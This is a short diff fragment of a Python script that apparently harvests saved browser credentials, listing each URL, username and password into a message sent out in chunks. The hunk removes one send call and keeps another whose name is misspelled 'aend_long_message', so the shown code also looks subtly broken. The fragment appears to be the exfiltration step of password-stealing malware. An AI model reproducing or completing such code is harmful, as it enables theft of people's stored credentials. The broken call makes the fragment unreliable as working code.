@@ -196,5 +196,4 @@ for p in passwords_v20:
     message += f"URL: {url_}\nUsername: {username}\nPassword: {password}\n" + ("-" * 50) + "\n"
 
 # Send the message in chunks if it's too long
-send_long_message1(message)
 aend_long_message(message)
